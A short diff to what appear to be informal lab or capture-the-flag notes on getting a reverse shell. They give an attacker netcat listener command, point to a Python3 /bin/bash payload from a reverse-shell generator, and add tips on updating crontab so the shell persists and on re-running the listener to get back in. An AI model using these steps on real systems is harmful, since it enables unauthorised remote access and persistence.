@@ -23,3 +23,7 @@ make sure to comment out #Your Name then put in your command.
 (ATTACKER) nc -lvp 55556
 
 (change your syntax with Reverse shell Gen if first one doesint work) Python3 shortest > /bin/bash > copy (refer to screen shot if directions are confusing)
+
+(make sure to update crontab with new syntax if you changed it then redo listener)
+
+(no when your terminal is killed just repeat the nc -lvp and your back in)
